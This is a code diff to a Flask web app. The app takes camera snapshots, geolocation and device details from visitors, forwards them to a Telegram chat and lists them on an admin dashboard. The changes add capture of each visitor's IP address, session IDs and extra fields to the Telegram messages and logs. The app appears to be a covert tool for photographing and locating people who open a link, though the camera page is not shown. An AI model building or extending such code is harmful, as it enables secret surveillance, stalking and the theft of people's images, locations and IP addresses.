@@ -14,8 +14,8 @@ def check_auth(auth):
     return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD
 
 def get_address(location_string):
-    if not location_string or "denied" in location_string or "not supported" in location_string or location_string == "Unknown Location":
-        return "Unknown Location"
+    if not location_string or "denied" in location_string or "not supported" in location_string or "error" in location_string:
+        return location_string 
     try:
         parts = location_string.split(",")
         if len(parts) == 2:
@@ -70,10 +70,11 @@ def gallery():
         .stat-box h3 {{ margin: 0 0 10px 0; font-size: 14px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }}
         .stat-box p {{ margin: 0; font-size: 32px; font-weight: bold; color: var(--accent); }}
         .list {{ display: flex; flex-direction: column; gap: 10px; }}
-        .log-item {{ background: var(--card); padding: 15px; border-radius: 8px; border-left: 4px solid var(--accent); display: flex; justify-content: space-between; align-items: center; }}
+        .log-item {{ background: var(--card); padding: 15px; border-radius: 8px; border-left: 4px solid var(--accent); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }}
         .log-time {{ color: #94a3b8; font-size: 12px; }}
         .log-loc {{ font-weight: bold; color: #10b981; font-size: 15px; }}
-        .log-device {{ color: #94a3b8; font-size: 11px; margin-top: 4px; display: block; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
+        .log-device {{ color: #94a3b8; font-size: 11px; margin-top: 4px; display: block; max-width: 400px; }}
+        .log-session {{ background: #38bdf8; color: #0f172a; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 12px; margin-right: 8px; }}
         .no-data {{ text-align: center; padding: 40px; color: #64748b; font-size: 18px; }}
     </style>
     <script>
@@ -82,7 +83,7 @@ def gallery():
     </head><body>
     
     <div class="header">
-        <h1>📷 Controller Command Center</h1>
+        <h1>📷 Controller Dashboard</h1>
         <div>
             <button class="btn" onclick="refreshPage()">🔄 Sync Status</button>
             <a href="/" class="btn" style="background:#334155; color:white;">Open Camera</a>
@@ -99,20 +100,22 @@ def gallery():
         ✈️ Open Telegram to View Photos
     </a>
 
-    <h3 style="color:var(--accent); margin-top: 30px;">Capture History & Locations</h3>
+    <h3 style="color:var(--accent); margin-top: 30px;">Capture History</h3>
     <div class="list">
     """
     
     if not logs:
-        html += "<div class='no-data'>No captures yet. Click 'Open Camera' to test.</div>"
+        html += "<div class='no-data'>No captures yet.</div>"
         
     for item in logs:
         html += f"""
         <div class="log-item">
             <div>
                 <span class="log-time">📅 {item.get('time', '')}</span><br>
+                <span class="log-session">{item.get('session', 'UNKNOWN')}</span>
                 <span class="log-loc">📍 {item.get('address', 'Unknown')}</span>
-                <span class="log-device">📱 {item.get('device', 'Unknown Device')}</span>
+                <span class="log-device">🌐 IP: {item.get('ip', 'Unknown')} | {item.get('extra', '')}</span>
+                <span class="log-device">📱 {item.get('device', 'Unknown Device')[:80]}...</span>
             </div>
             <a href="{item.get('map_link', '#')}" target="_blank" class="btn" style="padding: 8px 15px; font-size: 13px; background:#10b981; color:white;">View Map</a>
         </div>
@@ -127,6 +130,12 @@ def shot():
     b64 = (data.get("img") or "").split(",", 1)[-1]
     raw_loc = data.get("loc", "Unknown Location")
     device_info = data.get("device", "Unknown Device")
+    extra_info = data.get("extra", "No extra info")
+    session_id = data.get("session", "UNKNOWN")
+    
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if user_ip:
+        user_ip = user_ip.split(',')[0]
     
     if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
         try:
@@ -138,10 +147,13 @@ def shot():
             files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
             
             caption_text = (
+                f"🆔 Session: {session_id}\n"
                 f"📸 Capture: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n"
                 f"📍 Location: {address}\n"
                 f"🗺️ Map: {map_link}\n"
-                f"📱 Device: {device_info}"
+                f"🌐 IP: {user_ip}\n"
+                f"⚙️ {extra_info}\n"
+                f"📱 Device: {device_info[:60]}..."
             )
             
             payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption_text}
@@ -154,7 +166,10 @@ def shot():
                 "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "address": address,
                 "map_link": map_link,
-                "device": device_info
+                "device": device_info,
+                "extra": extra_info,
+                "ip": user_ip,
+                "session": session_id
             }
             
             logs = []
